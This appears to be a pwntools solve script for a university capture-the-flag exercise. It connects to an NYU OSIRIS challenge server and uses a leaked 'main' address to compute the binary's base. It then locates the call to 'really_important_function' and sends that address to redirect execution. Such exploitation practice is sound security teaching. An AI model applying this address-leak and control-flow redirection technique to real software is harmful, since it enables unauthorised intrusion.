from pwn import *

context.log_level = "info"


def print_address(descriptor, detail, address, convert=True):
    if convert:
        converted_address = hex(address)
    else:
        converted_address = address

    print(f"{descriptor:<30}{detail:<30}: {converted_address}")


LOCAL = False
source_address_name = "main"
target_address_name = "really_important_function"

if LOCAL:
    p = process("./directions")
    libc = "./directions"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1244)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./directions"

# Open Shared library to get offset addresses
e = ELF(libc)

# Extract the given address from the message and read up until expected input
print(p.recvuntil(b"somewhere: ").decode())
source_raw_address = p.recvline().strip()
print(p.recvuntil(b">").decode())
print_address(source_address_name, 'raw', source_raw_address, False)

## convert the bytes and use the ELF byteorder
source_address = int.from_bytes(source_raw_address, byteorder=e.endian)

print_address(source_address_name, 'address', source_address)

# Get source offset
source_address_offset = e.symbols[source_address_name]
print_address(source_address_name, 'offset', source_address_offset)

# Compute the base address from the offset and the given address (base = address - offset)
base_address = source_address - source_address_offset
print_address('base', 'address', base_address)

# Get the offset for the target address
target_address_offset = e.symbols[target_address_name]
print_address(target_address_name, 'offset', target_address_offset)

# Get the  calling address for the target
# Get the size of the .text section
text_section = e.get_section_by_name('.text')
text_section_size = text_section.header.sh_size
# Disassemble the binary
disassembly = e.disasm(e.entry, text_section_size)

# Find call instructions to the target function
target_calling_address_offset = 0x0
for line in disassembly.split('\n'):
    if f'call   {hex(target_address_offset)}' in line:
        target_calling_address_offset = int(line.split(':')[0], 16)
        break

print_address(target_address_name, 'function call offset', target_calling_address_offset)

# Compute the target address (address = base + offset)
target_call_address = base_address + target_calling_address_offset
print_address(target_address_name, 'call address', target_call_address)

# This challenge required raw bytes
target_call_address_raw = target_call_address.to_bytes((target_call_address.bit_length() + 7) // 4,
                                                       byteorder=e.endian)
print_address(target_address_name, 'call address raw', target_call_address_raw, False)

# Send the answer
p.sendline(target_call_address_raw)

# Reap the rewards
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
